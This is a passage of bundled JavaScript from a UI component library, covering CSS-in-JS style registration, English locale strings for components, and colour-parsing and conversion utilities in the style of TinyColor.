          if (Vt) return [Vt, wt, Mt, {}, st, ht];
        }
        var Ft = a(),
          Tt = parseStyle(Ft, {
            hashId: tt,
            hashPriority: _t,
            layer: yt ? nt : void 0,
            path: s.join("-"),
            transformers: Pt,
            linters: bt,
          }),
          At = _slicedToArray$1(Tt, 2),
          Lt = At[0],
          jt = At[1],
          Dt = normalizeStyle(Lt),
          Ut = uniqueHash($t, Dt);
        return [Dt, wt, Ut, jt, st, ht];
      },
      function (Bt, Wt) {
        var Gt = _slicedToArray$1(Bt, 3),
          Vt = Gt[2];
        (Wt || St) && isClientSide && removeCSS(Vt, { mark: ATTR_MARK });
      },
      function (Bt) {
        var Wt = _slicedToArray$1(Bt, 4),
          Gt = Wt[0];
        Wt[1];
        var Vt = Wt[2],
          Mt = Wt[3];
        if (kt && Gt !== CSS_FILE_STYLE) {
          var Ft = {
              mark: ATTR_MARK,
              prepend: yt ? !1 : "queue",
              attachTo: Et,
              priority: ht,
            },
            Tt = typeof ot == "function" ? ot() : ot;
          Tt && (Ft.csp = { nonce: Tt });
          var At = [],
            Lt = [];
          Object.keys(Mt).forEach(function (Dt) {
            Dt.startsWith("@layer") ? At.push(Dt) : Lt.push(Dt);
          }),
            At.forEach(function (Dt) {
              updateCSS(
                normalizeStyle(Mt[Dt]),
                "_layer-".concat(Dt),
                _objectSpread2$1(_objectSpread2$1({}, Ft), {}, { prepend: !0 })
              );
            });
          var jt = updateCSS(Gt, Vt, Ft);
          (jt[CSS_IN_JS_INSTANCE] = xt.instanceId),
            jt.setAttribute(ATTR_TOKEN, wt),
            Lt.forEach(function (Dt) {
              updateCSS(normalizeStyle(Mt[Dt]), "_effect-".concat(Dt), Ft);
            });
        }
      }
    ),
    It = _slicedToArray$1(Rt, 3),
    Ot = It[0],
    Nt = It[1],
    zt = It[2];
  return function (Bt) {
    var Wt;
    if (!Ct || kt || !vt) Wt = reactExports.createElement(Empty, null);
    else {
      var Gt;
      Wt = reactExports.createElement(
        "style",
        _extends(
          {},
          ((Gt = {}),
          _defineProperty$1(Gt, ATTR_TOKEN, Nt),
          _defineProperty$1(Gt, ATTR_MARK, zt),
          Gt),
          { dangerouslySetInnerHTML: { __html: Ot } }
        )
      );
    }
    return reactExports.createElement(reactExports.Fragment, null, Wt, Bt);
  };
}
var extract$1 = function (a, o, s) {
    var tt = _slicedToArray$1(a, 6),
      nt = tt[0],
      ot = tt[1],
      st = tt[2],
      ft = tt[3],
      ht = tt[4],
      gt = tt[5],
      St = s || {},
      vt = St.plain;
    if (ht) return null;
    var _t = nt,
      Et = {
        "data-rc-order": "prependQueue",
        "data-rc-priority": "".concat(gt),
      };
    return (
      (_t = toStyleStr(nt, ot, st, Et, vt)),
      ft &&
        Object.keys(ft).forEach(function (Ct) {
          if (!o[Ct]) {
            o[Ct] = !0;
            var Pt = normalizeStyle(ft[Ct]),
              bt = toStyleStr(Pt, ot, "_effect-".concat(Ct), Et, vt);
            Ct.startsWith("@layer") ? (_t = bt + _t) : (_t += bt);
          }
        }),
      [gt, st, _t]
    );
  },
  CSS_VAR_PREFIX = "cssVar",
  useCSSVarRegister = function (a, o) {
    var s = a.key,
      tt = a.prefix,
      nt = a.unitless,
      ot = a.ignore,
      st = a.token,
      ft = a.scope,
      ht = ft === void 0 ? "" : ft,
      gt = reactExports.useContext(StyleContext),
      St = gt.cache.instanceId,
      vt = gt.container,
      _t = st._tokenKey,
      Et = [].concat(_toConsumableArray(a.path), [s, ht, _t]),
      Ct = useGlobalCache(
        CSS_VAR_PREFIX,
        Et,
        function () {
          var Pt = o(),
            bt = transformToken(Pt, s, {
              prefix: tt,
              unitless: nt,
              ignore: ot,
              scope: ht,
            }),
            xt = _slicedToArray$1(bt, 2),
            yt = xt[0],
            wt = xt[1],
            $t = uniqueHash(Et, wt);
          return [yt, wt, $t, s];
        },
        function (Pt) {
          var bt = _slicedToArray$1(Pt, 3),
            xt = bt[2];
          isClientSide && removeCSS(xt, { mark: ATTR_MARK });
        },
        function (Pt) {
          var bt = _slicedToArray$1(Pt, 3),
            xt = bt[1],
            yt = bt[2];
          if (xt) {
            var wt = updateCSS(xt, yt, {
              mark: ATTR_MARK,
              prepend: "queue",
              attachTo: vt,
              priority: -999,
            });
            (wt[CSS_IN_JS_INSTANCE] = St), wt.setAttribute(ATTR_TOKEN, s);
          }
        }
      );
    return Ct;
  },
  extract = function (a, o, s) {
    var tt = _slicedToArray$1(a, 4),
      nt = tt[1],
      ot = tt[2],
      st = tt[3],
      ft = s || {},
      ht = ft.plain;
    if (!nt) return null;
    var gt = -999,
      St = {
        "data-rc-order": "prependQueue",
        "data-rc-priority": "".concat(gt),
      },
      vt = toStyleStr(nt, st, ot, St, ht);
    return [gt, ot, vt];
  },
  _ExtractStyleFns;
(_ExtractStyleFns = {}),
  _defineProperty$1(_ExtractStyleFns, STYLE_PREFIX, extract$1),
  _defineProperty$1(_ExtractStyleFns, TOKEN_PREFIX, extract$2),
  _defineProperty$1(_ExtractStyleFns, CSS_VAR_PREFIX, extract);
var Keyframe = (function () {
  function i(a, o) {
    _classCallCheck(this, i),
      _defineProperty$1(this, "name", void 0),
      _defineProperty$1(this, "style", void 0),
      _defineProperty$1(this, "_keyframe", !0),
      (this.name = a),
      (this.style = o);
  }
  return (
    _createClass(i, [
      {
        key: "getName",
        value: function () {
          var o =
            arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
          return o ? "".concat(o, "-").concat(this.name) : this.name;
        },
      },
    ]),
    i
  );
})();
function noSplit(i) {
  return (i.notSplit = !0), i;
}
noSplit(["borderTop", "borderBottom"]),
  noSplit(["borderTop"]),
  noSplit(["borderBottom"]),
  noSplit(["borderLeft", "borderRight"]),
  noSplit(["borderLeft"]),
  noSplit(["borderRight"]);
var IconContext = reactExports.createContext({});
function _toArray(i) {
  return (
    _arrayWithHoles$1(i) ||
    _iterableToArray(i) ||
    _unsupportedIterableToArray$1(i) ||
    _nonIterableRest$1()
  );
}
function get(i, a) {
  for (var o = i, s = 0; s < a.length; s += 1) {
    if (o == null) return;
    o = o[a[s]];
  }
  return o;
}
function internalSet(i, a, o, s) {
  if (!a.length) return o;
  var tt = _toArray(a),
    nt = tt[0],
    ot = tt.slice(1),
    st;
  return (
    !i && typeof nt == "number"
      ? (st = [])
      : Array.isArray(i)
      ? (st = _toConsumableArray(i))
      : (st = _objectSpread2$1({}, i)),
    s && o === void 0 && ot.length === 1
      ? delete st[nt][ot[0]]
      : (st[nt] = internalSet(st[nt], ot, o, s)),
    st
  );
}
function set$1(i, a, o) {
  var s = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : !1;
  return a.length && s && o === void 0 && !get(i, a.slice(0, -1))
    ? i
    : internalSet(i, a, o, s);
}
function isObject(i) {
  return (
    _typeof(i) === "object" &&
    i !== null &&
    Object.getPrototypeOf(i) === Object.prototype
  );
}
function createEmpty(i) {
  return Array.isArray(i) ? [] : {};
}
var keys = typeof Reflect > "u" ? Object.keys : Reflect.ownKeys;
function merge$1() {
  for (var i = arguments.length, a = new Array(i), o = 0; o < i; o++)
    a[o] = arguments[o];
  var s = createEmpty(a[0]);
  return (
    a.forEach(function (tt) {
      function nt(ot, st) {
        var ft = new Set(st),
          ht = get(tt, ot),
          gt = Array.isArray(ht);
        if (gt || isObject(ht)) {
          if (!ft.has(ht)) {
            ft.add(ht);
            var St = get(s, ot);
            gt
              ? (s = set$1(s, ot, []))
              : (!St || _typeof(St) !== "object") &&
                (s = set$1(s, ot, createEmpty(ht))),
              keys(ht).forEach(function (vt) {
                nt([].concat(_toConsumableArray(ot), [vt]), ft);
              });
          }
        } else s = set$1(s, ot, ht);
      }
      nt([]);
    }),
    s
  );
}
function noop$2() {}
const WarningContext = reactExports.createContext({}),
  devUseWarning = () => {
    const i = () => {};
    return (i.deprecated = noop$2), i;
  },
  ValidateMessagesContext = reactExports.createContext(void 0);
var locale$3 = {
    items_per_page: "/ page",
    jump_to: "Go to",
    jump_to_confirm: "confirm",
    page: "Page",
    prev_page: "Previous Page",
    next_page: "Next Page",
    prev_5: "Previous 5 Pages",
    next_5: "Next 5 Pages",
    prev_3: "Previous 3 Pages",
    next_3: "Next 3 Pages",
    page_size: "Page Size",
  },
  commonLocale = {
    yearFormat: "YYYY",
    dayFormat: "D",
    cellMeridiemFormat: "A",
    monthBeforeYear: !0,
  },
  locale$2 = _objectSpread2$1(
    _objectSpread2$1({}, commonLocale),
    {},
    {
      locale: "en_US",
      today: "Today",
      now: "Now",
      backToToday: "Back to today",
      ok: "OK",
      clear: "Clear",
      month: "Month",
      year: "Year",
      timeSelect: "select time",
      dateSelect: "select date",
      weekSelect: "Choose a week",
      monthSelect: "Choose a month",
      yearSelect: "Choose a year",
      decadeSelect: "Choose a decade",
      dateFormat: "M/D/YYYY",
      dateTimeFormat: "M/D/YYYY HH:mm:ss",
      previousMonth: "Previous month (PageUp)",
      nextMonth: "Next month (PageDown)",
      previousYear: "Last year (Control + left)",
      nextYear: "Next year (Control + right)",
      previousDecade: "Last decade",
      nextDecade: "Next decade",
      previousCentury: "Last century",
      nextCentury: "Next century",
    }
  );
const locale$1 = {
    placeholder: "Select time",
    rangePlaceholder: ["Start time", "End time"],
  },
  locale = {
    lang: Object.assign(
      {
        placeholder: "Select date",
        yearPlaceholder: "Select year",
        quarterPlaceholder: "Select quarter",
        monthPlaceholder: "Select month",
        weekPlaceholder: "Select week",
        rangePlaceholder: ["Start date", "End date"],
        rangeYearPlaceholder: ["Start year", "End year"],
        rangeQuarterPlaceholder: ["Start quarter", "End quarter"],
        rangeMonthPlaceholder: ["Start month", "End month"],
        rangeWeekPlaceholder: ["Start week", "End week"],
      },
      locale$2
    ),
    timePickerLocale: Object.assign({}, locale$1),
  },
  typeTemplate$1 = "${label} is not a valid ${type}",
  localeValues = {
    locale: "en",
    Pagination: locale$3,
    DatePicker: locale,
    TimePicker: locale$1,
    Calendar: locale,
    global: { placeholder: "Please select" },
    Table: {
      filterTitle: "Filter menu",
      filterConfirm: "OK",
      filterReset: "Reset",
      filterEmptyText: "No filters",
      filterCheckall: "Select all items",
      filterSearchPlaceholder: "Search in filters",
      emptyText: "No data",
      selectAll: "Select current page",
      selectInvert: "Invert current page",
      selectNone: "Clear all data",
      selectionAll: "Select all data",
      sortTitle: "Sort",
      expand: "Expand row",
      collapse: "Collapse row",
      triggerDesc: "Click to sort descending",
      triggerAsc: "Click to sort ascending",
      cancelSort: "Click to cancel sorting",
    },
    Tour: { Next: "Next", Previous: "Previous", Finish: "Finish" },
    Modal: { okText: "OK", cancelText: "Cancel", justOkText: "OK" },
    Popconfirm: { okText: "OK", cancelText: "Cancel" },
    Transfer: {
      titles: ["", ""],
      searchPlaceholder: "Search here",
      itemUnit: "item",
      itemsUnit: "items",
      remove: "Remove",
      selectCurrent: "Select current page",
      removeCurrent: "Remove current page",
      selectAll: "Select all data",
      deselectAll: "Deselect all data",
      removeAll: "Remove all data",
      selectInvert: "Invert current page",
    },
    Upload: {
      uploading: "Uploading...",
      removeFile: "Remove file",
      uploadError: "Upload error",
      previewFile: "Preview file",
      downloadFile: "Download file",
    },
    Empty: { description: "No data" },
    Icon: { icon: "icon" },
    Text: {
      edit: "Edit",
      copy: "Copy",
      copied: "Copied",
      expand: "Expand",
      collapse: "Collapse",
    },
    Form: {
      optional: "(optional)",
      defaultValidateMessages: {
        default: "Field validation error for ${label}",
        required: "Please enter ${label}",
        enum: "${label} must be one of [${enum}]",
        whitespace: "${label} cannot be a blank character",
        date: {
          format: "${label} date format is invalid",
          parse: "${label} cannot be converted to a date",
          invalid: "${label} is an invalid date",
        },
        types: {
          string: typeTemplate$1,
          method: typeTemplate$1,
          array: typeTemplate$1,
          object: typeTemplate$1,
          number: typeTemplate$1,
          date: typeTemplate$1,
          boolean: typeTemplate$1,
          integer: typeTemplate$1,
          float: typeTemplate$1,
          regexp: typeTemplate$1,
          email: typeTemplate$1,
          url: typeTemplate$1,
          hex: typeTemplate$1,
        },
        string: {
          len: "${label} must be ${len} characters",
          min: "${label} must be at least ${min} characters",
          max: "${label} must be up to ${max} characters",
          range: "${label} must be between ${min}-${max} characters",
        },
        number: {
          len: "${label} must be equal to ${len}",
          min: "${label} must be minimum ${min}",
          max: "${label} must be maximum ${max}",
          range: "${label} must be between ${min}-${max}",
        },
        array: {
          len: "Must be ${len} ${label}",
          min: "At least ${min} ${label}",
          max: "At most ${max} ${label}",
          range: "The amount of ${label} must be between ${min}-${max}",
        },
        pattern: { mismatch: "${label} does not match the pattern ${pattern}" },
      },
    },
    Image: { preview: "Preview" },
    QRCode: {
      expired: "QR code expired",
      refresh: "Refresh",
      scanned: "Scanned",
    },
    ColorPicker: {
      presetEmpty: "Empty",
      transparent: "Transparent",
      singleColor: "Single",
      gradientColor: "Gradient",
    },
  };
Object.assign({}, localeValues.Modal);
let localeList = [];
const generateLocale = () =>
  localeList.reduce(
    (i, a) => Object.assign(Object.assign({}, i), a),
    localeValues.Modal
  );
function changeConfirmLocale(i) {
  if (i) {
    const a = Object.assign({}, i);
    return (
      localeList.push(a),
      generateLocale(),
      () => {
        (localeList = localeList.filter((o) => o !== a)), generateLocale();
      }
    );
  }
  Object.assign({}, localeValues.Modal);
}
const LocaleContext = reactExports.createContext(void 0),
  ANT_MARK = "internalMark",
  LocaleProvider = (i) => {
    const { locale: a = {}, children: o, _ANT_MARK__: s } = i;
    reactExports.useEffect(
      () => changeConfirmLocale(a == null ? void 0 : a.Modal),
      [a]
    );
    const tt = reactExports.useMemo(
      () => Object.assign(Object.assign({}, a), { exist: !0 }),
      [a]
    );
    return reactExports.createElement(LocaleContext.Provider, { value: tt }, o);
  };
function bound01(i, a) {
  isOnePointZero(i) && (i = "100%");
  var o = isPercentage(i);
  return (
    (i = a === 360 ? i : Math.min(a, Math.max(0, parseFloat(i)))),
    o && (i = parseInt(String(i * a), 10) / 100),
    Math.abs(i - a) < 1e-6
      ? 1
      : (a === 360
          ? (i = (i < 0 ? (i % a) + a : i % a) / parseFloat(String(a)))
          : (i = (i % a) / parseFloat(String(a))),
        i)
  );
}
function clamp01(i) {
  return Math.min(1, Math.max(0, i));
}
function isOnePointZero(i) {
  return typeof i == "string" && i.indexOf(".") !== -1 && parseFloat(i) === 1;
}
function isPercentage(i) {
  return typeof i == "string" && i.indexOf("%") !== -1;
}
function boundAlpha(i) {
  return (i = parseFloat(i)), (isNaN(i) || i < 0 || i > 1) && (i = 1), i;
}
function convertToPercentage(i) {
  return i <= 1 ? "".concat(Number(i) * 100, "%") : i;
}
function pad2(i) {
  return i.length === 1 ? "0" + i : String(i);
}
function rgbToRgb(i, a, o) {
  return {
    r: bound01(i, 255) * 255,
    g: bound01(a, 255) * 255,
    b: bound01(o, 255) * 255,
  };
}
function rgbToHsl(i, a, o) {
  (i = bound01(i, 255)), (a = bound01(a, 255)), (o = bound01(o, 255));
  var s = Math.max(i, a, o),
    tt = Math.min(i, a, o),
    nt = 0,
    ot = 0,
    st = (s + tt) / 2;
  if (s === tt) (ot = 0), (nt = 0);
  else {
    var ft = s - tt;
    switch (((ot = st > 0.5 ? ft / (2 - s - tt) : ft / (s + tt)), s)) {
      case i:
        nt = (a - o) / ft + (a < o ? 6 : 0);
        break;
      case a:
        nt = (o - i) / ft + 2;
        break;
      case o:
        nt = (i - a) / ft + 4;
        break;
    }
    nt /= 6;
  }
  return { h: nt, s: ot, l: st };
}
function hue2rgb(i, a, o) {
  return (
    o < 0 && (o += 1),
    o > 1 && (o -= 1),
    o < 1 / 6
      ? i + (a - i) * (6 * o)
      : o < 1 / 2
      ? a
      : o < 2 / 3
      ? i + (a - i) * (2 / 3 - o) * 6
      : i
  );
}
function hslToRgb(i, a, o) {
  var s, tt, nt;
  if (
    ((i = bound01(i, 360)),
    (a = bound01(a, 100)),
    (o = bound01(o, 100)),
    a === 0)
  )
    (tt = o), (nt = o), (s = o);
  else {
    var ot = o < 0.5 ? o * (1 + a) : o + a - o * a,
      st = 2 * o - ot;
    (s = hue2rgb(st, ot, i + 1 / 3)),
      (tt = hue2rgb(st, ot, i)),
      (nt = hue2rgb(st, ot, i - 1 / 3));
  }
  return { r: s * 255, g: tt * 255, b: nt * 255 };
}
function rgbToHsv(i, a, o) {
  (i = bound01(i, 255)), (a = bound01(a, 255)), (o = bound01(o, 255));
  var s = Math.max(i, a, o),
    tt = Math.min(i, a, o),
    nt = 0,
    ot = s,
    st = s - tt,
    ft = s === 0 ? 0 : st / s;
  if (s === tt) nt = 0;
  else {
    switch (s) {
      case i:
        nt = (a - o) / st + (a < o ? 6 : 0);
        break;
      case a:
        nt = (o - i) / st + 2;
        break;
      case o:
        nt = (i - a) / st + 4;
        break;
    }
    nt /= 6;
  }
  return { h: nt, s: ft, v: ot };
}
function hsvToRgb(i, a, o) {
  (i = bound01(i, 360) * 6), (a = bound01(a, 100)), (o = bound01(o, 100));
  var s = Math.floor(i),
    tt = i - s,
    nt = o * (1 - a),
    ot = o * (1 - tt * a),
    st = o * (1 - (1 - tt) * a),
    ft = s % 6,
    ht = [o, ot, nt, nt, st, o][ft],
    gt = [st, o, o, ot, nt, nt][ft],
    St = [nt, nt, st, o, o, ot][ft];
  return { r: ht * 255, g: gt * 255, b: St * 255 };
}
function rgbToHex(i, a, o, s) {
  var tt = [
    pad2(Math.round(i).toString(16)),
    pad2(Math.round(a).toString(16)),
    pad2(Math.round(o).toString(16)),
  ];
  return s &&
    tt[0].startsWith(tt[0].charAt(1)) &&
    tt[1].startsWith(tt[1].charAt(1)) &&
    tt[2].startsWith(tt[2].charAt(1))
    ? tt[0].charAt(0) + tt[1].charAt(0) + tt[2].charAt(0)
    : tt.join("");
}
function rgbaToHex(i, a, o, s, tt) {
  var nt = [
    pad2(Math.round(i).toString(16)),
    pad2(Math.round(a).toString(16)),
    pad2(Math.round(o).toString(16)),
    pad2(convertDecimalToHex(s)),
  ];
  return tt &&
    nt[0].startsWith(nt[0].charAt(1)) &&
    nt[1].startsWith(nt[1].charAt(1)) &&
    nt[2].startsWith(nt[2].charAt(1)) &&
    nt[3].startsWith(nt[3].charAt(1))
    ? nt[0].charAt(0) + nt[1].charAt(0) + nt[2].charAt(0) + nt[3].charAt(0)
    : nt.join("");
}
function convertDecimalToHex(i) {
  return Math.round(parseFloat(i) * 255).toString(16);
}
function convertHexToDecimal(i) {
  return parseIntFromHex(i) / 255;
}
function parseIntFromHex(i) {
  return parseInt(i, 16);
}
function numberInputToObject(i) {
  return { r: i >> 16, g: (i & 65280) >> 8, b: i & 255 };
}
var names = {
  aliceblue: "#f0f8ff",
  antiquewhite: "#faebd7",
  aqua: "#00ffff",
  aquamarine: "#7fffd4",
  azure: "#f0ffff",
  beige: "#f5f5dc",
  bisque: "#ffe4c4",
  black: "#000000",
  blanchedalmond: "#ffebcd",
  blue: "#0000ff",
  blueviolet: "#8a2be2",
  brown: "#a52a2a",
  burlywood: "#deb887",
  cadetblue: "#5f9ea0",
  chartreuse: "#7fff00",
  chocolate: "#d2691e",
  coral: "#ff7f50",
  cornflowerblue: "#6495ed",
  cornsilk: "#fff8dc",
  crimson: "#dc143c",
  cyan: "#00ffff",
  darkblue: "#00008b",
  darkcyan: "#008b8b",
  darkgoldenrod: "#b8860b",
  darkgray: "#a9a9a9",
  darkgreen: "#006400",
  darkgrey: "#a9a9a9",
  darkkhaki: "#bdb76b",
  darkmagenta: "#8b008b",
  darkolivegreen: "#556b2f",
  darkorange: "#ff8c00",
  darkorchid: "#9932cc",
  darkred: "#8b0000",
  darksalmon: "#e9967a",
  darkseagreen: "#8fbc8f",
  darkslateblue: "#483d8b",
  darkslategray: "#2f4f4f",
  darkslategrey: "#2f4f4f",
  darkturquoise: "#00ced1",
  darkviolet: "#9400d3",
  deeppink: "#ff1493",
  deepskyblue: "#00bfff",
  dimgray: "#696969",
  dimgrey: "#696969",
  dodgerblue: "#1e90ff",
  firebrick: "#b22222",
  floralwhite: "#fffaf0",
  forestgreen: "#228b22",
  fuchsia: "#ff00ff",
  gainsboro: "#dcdcdc",
  ghostwhite: "#f8f8ff",
  goldenrod: "#daa520",
  gold: "#ffd700",
  gray: "#808080",
  green: "#008000",
  greenyellow: "#adff2f",
  grey: "#808080",
  honeydew: "#f0fff0",
  hotpink: "#ff69b4",
  indianred: "#cd5c5c",
  indigo: "#4b0082",
  ivory: "#fffff0",
  khaki: "#f0e68c",
  lavenderblush: "#fff0f5",
  lavender: "#e6e6fa",
  lawngreen: "#7cfc00",
  lemonchiffon: "#fffacd",
  lightblue: "#add8e6",
  lightcoral: "#f08080",
  lightcyan: "#e0ffff",
  lightgoldenrodyellow: "#fafad2",
  lightgray: "#d3d3d3",
  lightgreen: "#90ee90",
  lightgrey: "#d3d3d3",
  lightpink: "#ffb6c1",
  lightsalmon: "#ffa07a",
  lightseagreen: "#20b2aa",
  lightskyblue: "#87cefa",
  lightslategray: "#778899",
  lightslategrey: "#778899",
  lightsteelblue: "#b0c4de",
  lightyellow: "#ffffe0",
  lime: "#00ff00",
  limegreen: "#32cd32",
  linen: "#faf0e6",
  magenta: "#ff00ff",
  maroon: "#800000",
  mediumaquamarine: "#66cdaa",
  mediumblue: "#0000cd",
  mediumorchid: "#ba55d3",
  mediumpurple: "#9370db",
  mediumseagreen: "#3cb371",
  mediumslateblue: "#7b68ee",
  mediumspringgreen: "#00fa9a",
  mediumturquoise: "#48d1cc",
  mediumvioletred: "#c71585",
  midnightblue: "#191970",
  mintcream: "#f5fffa",
  mistyrose: "#ffe4e1",
  moccasin: "#ffe4b5",
  navajowhite: "#ffdead",
  navy: "#000080",
  oldlace: "#fdf5e6",
  olive: "#808000",
  olivedrab: "#6b8e23",
  orange: "#ffa500",
  orangered: "#ff4500",
  orchid: "#da70d6",
  palegoldenrod: "#eee8aa",
  palegreen: "#98fb98",
  paleturquoise: "#afeeee",
  palevioletred: "#db7093",
  papayawhip: "#ffefd5",
  peachpuff: "#ffdab9",
  peru: "#cd853f",
  pink: "#ffc0cb",
  plum: "#dda0dd",
  powderblue: "#b0e0e6",
  purple: "#800080",
  rebeccapurple: "#663399",
  red: "#ff0000",
  rosybrown: "#bc8f8f",
  royalblue: "#4169e1",
  saddlebrown: "#8b4513",
  salmon: "#fa8072",
  sandybrown: "#f4a460",
  seagreen: "#2e8b57",
  seashell: "#fff5ee",
  sienna: "#a0522d",
  silver: "#c0c0c0",
  skyblue: "#87ceeb",
  slateblue: "#6a5acd",
  slategray: "#708090",
  slategrey: "#708090",
  snow: "#fffafa",
  springgreen: "#00ff7f",
  steelblue: "#4682b4",
  tan: "#d2b48c",
  teal: "#008080",
  thistle: "#d8bfd8",
  tomato: "#ff6347",
  turquoise: "#40e0d0",
  violet: "#ee82ee",
  wheat: "#f5deb3",
  white: "#ffffff",
  whitesmoke: "#f5f5f5",
  yellow: "#ffff00",
  yellowgreen: "#9acd32",
};
function inputToRGB(i) {
  var a = { r: 0, g: 0, b: 0 },
    o = 1,
    s = null,
    tt = null,
    nt = null,
    ot = !1,
    st = !1;
  return (
    typeof i == "string" && (i = stringInputToObject(i)),
    typeof i == "object" &&
      (isValidCSSUnit(i.r) && isValidCSSUnit(i.g) && isValidCSSUnit(i.b)
        ? ((a = rgbToRgb(i.r, i.g, i.b)),
          (ot = !0),
          (st = String(i.r).substr(-1) === "%" ? "prgb" : "rgb"))
        : isValidCSSUnit(i.h) && isValidCSSUnit(i.s) && isValidCSSUnit(i.v)
        ? ((s = convertToPercentage(i.s)),
          (tt = convertToPercentage(i.v)),
          (a = hsvToRgb(i.h, s, tt)),
          (ot = !0),
          (st = "hsv"))
        : isValidCSSUnit(i.h) &&
          isValidCSSUnit(i.s) &&
          isValidCSSUnit(i.l) &&
          ((s = convertToPercentage(i.s)),
          (nt = convertToPercentage(i.l)),
          (a = hslToRgb(i.h, s, nt)),
          (ot = !0),
          (st = "hsl")),
      Object.prototype.hasOwnProperty.call(i, "a") && (o = i.a)),
    (o = boundAlpha(o)),
    {
      ok: ot,
      format: i.format || st,
      r: Math.min(255, Math.max(a.r, 0)),
      g: Math.min(255, Math.max(a.g, 0)),
      b: Math.min(255, Math.max(a.b, 0)),
      a: o,
    }
  );
}
var CSS_INTEGER = "[-\\+]?\\d+%?",
  CSS_NUMBER = "[-\\+]?\\d*\\.\\d+%?",
  CSS_UNIT = "(?:".concat(CSS_NUMBER, ")|(?:").concat(CSS_INTEGER, ")"),
  PERMISSIVE_MATCH3 = "[\\s|\\(]+("
    .concat(CSS_UNIT, ")[,|\\s]+(")
    .concat(CSS_UNIT, ")[,|\\s]+(")
    .concat(CSS_UNIT, ")\\s*\\)?"),
  PERMISSIVE_MATCH4 = "[\\s|\\(]+("
    .concat(CSS_UNIT, ")[,|\\s]+(")
    .concat(CSS_UNIT, ")[,|\\s]+(")
    .concat(CSS_UNIT, ")[,|\\s]+(")
    .concat(CSS_UNIT, ")\\s*\\)?"),
  matchers = {
    CSS_UNIT: new RegExp(CSS_UNIT),
    rgb: new RegExp("rgb" + PERMISSIVE_MATCH3),
    rgba: new RegExp("rgba" + PERMISSIVE_MATCH4),
    hsl: new RegExp("hsl" + PERMISSIVE_MATCH3),
    hsla: new RegExp("hsla" + PERMISSIVE_MATCH4),
    hsv: new RegExp("hsv" + PERMISSIVE_MATCH3),
    hsva: new RegExp("hsva" + PERMISSIVE_MATCH4),
    hex3: /^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
    hex6: /^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,
    hex4: /^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
    hex8: /^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,
  };
function stringInputToObject(i) {
  if (((i = i.trim().toLowerCase()), i.length === 0)) return !1;
  var a = !1;
  if (names[i]) (i = names[i]), (a = !0);
  else if (i === "transparent")
    return { r: 0, g: 0, b: 0, a: 0, format: "name" };
  var o = matchers.rgb.exec(i);
  return o
    ? { r: o[1], g: o[2], b: o[3] }
    : ((o = matchers.rgba.exec(i)),
      o
        ? { r: o[1], g: o[2], b: o[3], a: o[4] }
        : ((o = matchers.hsl.exec(i)),
          o
            ? { h: o[1], s: o[2], l: o[3] }
            : ((o = matchers.hsla.exec(i)),
              o
                ? { h: o[1], s: o[2], l: o[3], a: o[4] }
                : ((o = matchers.hsv.exec(i)),
                  o
                    ? { h: o[1], s: o[2], v: o[3] }
                    : ((o = matchers.hsva.exec(i)),
                      o
                        ? { h: o[1], s: o[2], v: o[3], a: o[4] }
                        : ((o = matchers.hex8.exec(i)),
                          o
                            ? {
                                r: parseIntFromHex(o[1]),
                                g: parseIntFromHex(o[2]),
                                b: parseIntFromHex(o[3]),
                                a: convertHexToDecimal(o[4]),
                                format: a ? "name" : "hex8",
                              }
                            : ((o = matchers.hex6.exec(i)),
                              o
                                ? {
                                    r: parseIntFromHex(o[1]),
                                    g: parseIntFromHex(o[2]),
                                    b: parseIntFromHex(o[3]),
                                    format: a ? "name" : "hex",
                                  }
                                : ((o = matchers.hex4.exec(i)),
                                  o
                                    ? {
                                        r: parseIntFromHex(o[1] + o[1]),
                                        g: parseIntFromHex(o[2] + o[2]),
                                        b: parseIntFromHex(o[3] + o[3]),
                                        a: convertHexToDecimal(o[4] + o[4]),
                                        format: a ? "name" : "hex8",
                                      }
                                    : ((o = matchers.hex3.exec(i)),
                                      o
                                        ? {
                                            r: parseIntFromHex(o[1] + o[1]),
                                            g: parseIntFromHex(o[2] + o[2]),
                                            b: parseIntFromHex(o[3] + o[3]),
                                            format: a ? "name" : "hex",
                                          }
                                        : !1)))))))));
}
function isValidCSSUnit(i) {
  return !!matchers.CSS_UNIT.exec(String(i));
}
var TinyColor = (function () {
    function i(a, o) {
      a === void 0 && (a = ""), o === void 0 && (o = {});
      var s;
      if (a instanceof i) return a;
      typeof a == "number" && (a = numberInputToObject(a)),
        (this.originalInput = a);
      var tt = inputToRGB(a);
      (this.originalInput = a),
        (this.r = tt.r),
        (this.g = tt.g),
        (this.b = tt.b),
        (this.a = tt.a),
        (this.roundA = Math.round(100 * this.a) / 100),
        (this.format = (s = o.format) !== null && s !== void 0 ? s : tt.format),
        (this.gradientType = o.gradientType),
        this.r < 1 && (this.r = Math.round(this.r)),
        this.g < 1 && (this.g = Math.round(this.g)),
        this.b < 1 && (this.b = Math.round(this.b)),
        (this.isValid = tt.ok);
    }
    return (
      (i.prototype.isDark = function () {
        return this.getBrightness() < 128;
      }),
      (i.prototype.isLight = function () {
        return !this.isDark();
      }),
      (i.prototype.getBrightness = function () {
        var a = this.toRgb();
        return (a.r * 299 + a.g * 587 + a.b * 114) / 1e3;
      }),
      (i.prototype.getLuminance = function () {
        var a = this.toRgb(),
          o,
          s,
          tt,
          nt = a.r / 255,
          ot = a.g / 255,
          st = a.b / 255;
        return (
          nt <= 0.03928
            ? (o = nt / 12.92)
            : (o = Math.pow((nt + 0.055) / 1.055, 2.4)),
          ot <= 0.03928
            ? (s = ot / 12.92)
            : (s = Math.pow((ot + 0.055) / 1.055, 2.4)),
          st <= 0.03928
            ? (tt = st / 12.92)
            : (tt = Math.pow((st + 0.055) / 1.055, 2.4)),
          0.2126 * o + 0.7152 * s + 0.0722 * tt
        );
      }),
      (i.prototype.getAlpha = function () {
        return this.a;
      }),
      (i.prototype.setAlpha = function (a) {
        return (
          (this.a = boundAlpha(a)),
          (this.roundA = Math.round(100 * this.a) / 100),
          this
        );
      }),
      (i.prototype.isMonochrome = function () {
        var a = this.toHsl().s;
        return a === 0;
      }),
      (i.prototype.toHsv = function () {
